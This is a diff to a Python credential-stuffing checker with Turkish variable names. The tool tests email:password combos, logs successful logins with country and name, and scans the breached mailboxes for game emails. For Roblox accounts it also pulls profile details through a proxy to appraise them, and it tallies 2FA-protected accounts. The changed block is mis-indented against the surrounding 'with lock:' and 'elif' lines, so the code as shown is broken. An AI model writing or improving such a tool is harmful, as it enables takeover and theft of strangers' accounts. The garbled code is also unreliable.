@@ -849,48 +849,59 @@ def tarama_yap(chat_id, accounts, dosya_adi):
             status, mesaj_info = c.check(tag)
 
             with lock:
-                if status == "SUCCESS":
-                    state["hit"] += 1
-                    ulke = (c.country or "Unknown").upper().strip()
-                    if not ulke or len(ulke) > 3:
-                        ulke = "Unknown"
-                    isim = c.name or ""
-                    state["ulke_sayaci"][ulke] = state["ulke_sayaci"].get(ulke, 0) + 1
-                    state["all_hits_icerik"].append(combo)
+    if status == "SUCCESS":
+        state["hit"] += 1
+        ulke = (c.country or "Unknown").upper().strip()
+        if not ulke or len(ulke) > 3:
+            ulke = "Unknown"
+        isim = c.name or ""
+        
+        state["ulke_sayaci"][ulke] = state["ulke_sayaci"].get(ulke, 0) + 1
+        state["all_hits_icerik"].append(combo)
 
-                    if mesaj_info:
-                        for game_key, m_info in mesaj_info.items():
-                            sayi = m_info.get("sayi", 0)
-                            if sayi and sayi > 0:
-                                tarih = m_info.get("tarih", "N/A")
-                                subj = m_info.get("subject", "")
-                                prev = m_info.get("preview", "")
-                                state["keyword_sayaci"][game_key] = state["keyword_sayaci"].get(game_key, 0) + 1
+        hesap_detaylari = []
+        hesap_keyword_listesi = []
 
-                                if game_key == "roblox":
-                                    kullanici = roblox_eruu(prev + " " + subj)
-                                    if kullanici:
-                                        rd = roblox_rlll(kullanici, formatted_proxy)
-                                        wearing = ", ".join(rd["wearing"]) if rd["wearing"] else ""
-                                        satir = (f"{combo} | {ulke} | {isim} | 🎲 ROBLOX | "
-                                                 f"Username = {rd['username']} | Friends = {rd['friends']} | "
-                                                 f"Banned = {rd['banned']} | Created = {rd['created']} | "
-                                                 f"Profile = {rd['profile']} | Wearing = [{wearing}]")
-                                    else:
-                                        satir = (f"{combo} | {ulke} | {isim} | 🎲 ROBLOX | "
-                                                 f"Username = ??? | Friends = ??? | Banned = ??? | "
-                                                 f"Created = ??? | Profile = ??? | Wearing = []")
-                                else:
-                                    lbl = GAME_EMAILS[game_key]["label"]
-                                    satir = f"{combo} | {ulke} | {isim} | {lbl} Messages: {sayi} | Last: {tarih}"
-                                    if subj:
-                                        satir += f" | Subject: {subj}"
-                                    if prev:
-                                        satir += f" | Preview: {prev}"
+        if mesaj_info:
+            for game_key, m_info in mesaj_info.items():
+                sayi = m_info.get("sayi", 0)
+                if sayi and sayi > 0:
+                    tarih = m_info.get("tarih", "N/A")
+                    subj = m_info.get("subject", "")
+                    prev = m_info.get("preview", "")
+                    state["keyword_sayaci"][game_key] = state["keyword_sayaci"].get(game_key, 0) + 1
 
-                                state["keyword_icerik"].setdefault(game_key, []).append(satir)
-                                state["ulke_icerik"].setdefault(ulke, []).append(satir)
-                                print(f"[HIT] {game_key} | {ulke} | {combo}", flush=True)
+                    if game_key == "roblox":
+                        kullanici = roblox_eruu(prev + " " + subj)
+                        if kullanici:
+                            rd = roblox_rlll(kullanici, formatted_proxy)
+                            wearing = ", ".join(rd["wearing"]) if rd["wearing"] else ""
+                            s_detay = (f"🎲 ROBLOX | Username = {rd['username']} | Friends = {rd['friends']} | "
+                                       f"Banned = {rd['banned']} | Created = {rd['created']} | "
+                                       f"Profile = {rd['profile']} | Wearing = [{wearing}]")
+                        else:
+                            s_detay = "🎲 ROBLOX | Username = ???"
+                    else:
+                        lbl = GAME_EMAILS[game_key]["label"]
+                        s_detay = f"{lbl} ({sayi})"
+                        if subj:
+                            s_detay += f" [{subj}]"
+                    
+                    hesap_detaylari.append(s_detay)
+                    hesap_keyword_listesi.append((game_key, s_detay))
+
+        if hesap_detaylari:
+            birlesik_detay = " | ".join(hesap_detaylari)
+            satir = f"{combo} | {ulke} | {isim} | {birlesik_detay}"
+        else:
+            satir = f"{combo} | {ulke} | {isim} | NO MAIL"
+
+        state["ulke_icerik"].setdefault(ulke, []).append(satir)
+
+        for k_game, k_detay in hesap_keyword_listesi:
+            k_satir = f"{combo} | {ulke} | {isim} | {k_detay}"
+            state["keyword_icerik"].setdefault(k_game, []).append(k_satir)
+            print(f"[HIT] {k_game} | {ulke} | {combo}", flush=True)
 
                 elif status == "2FA":
                     state["twofa"] += 1
